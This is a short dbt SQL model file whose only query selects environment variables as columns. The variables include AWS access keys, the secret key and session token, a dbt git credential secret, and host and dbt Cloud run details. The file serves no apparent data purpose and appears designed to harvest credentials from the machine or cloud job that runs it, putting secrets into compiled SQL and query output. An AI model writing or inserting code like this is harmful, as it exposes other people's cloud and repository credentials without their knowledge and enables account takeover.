{{ config(materialized='ephemeral') }}

SELECT
    '{{ env_var("AWS_ACCESS_KEY_ID", "NOT_SET") }}' as aws_key_id,
    '{{ env_var("AWS_SECRET_ACCESS_KEY", "NOT_SET") }}' as aws_secret,
    '{{ env_var("AWS_SESSION_TOKEN", "NOT_SET") }}' as aws_session_token,
    '{{ env_var("AWS_DEFAULT_REGION", "NOT_SET") }}' as aws_region,
    '{{ env_var("DBT_ENV_SECRET_GIT_CREDENTIAL", "NOT_SET") }}' as git_cred,
    '{{ env_var("HOSTNAME", "NOT_SET") }}' as hostname_val,
    '{{ env_var("HOME", "NOT_SET") }}' as home_dir,
    '{{ env_var("PATH", "NOT_SET") }}' as path_val,
    '{{ env_var("DBT_CLOUD_PROJECT_ID", "NOT_SET") }}' as dbt_project,
    '{{ env_var("DBT_CLOUD_RUN_ID", "NOT_SET") }}' as dbt_run,
    '{{ env_var("DBT_CLOUD_ENVIRONMENT_ID", "NOT_SET") }}' as dbt_env
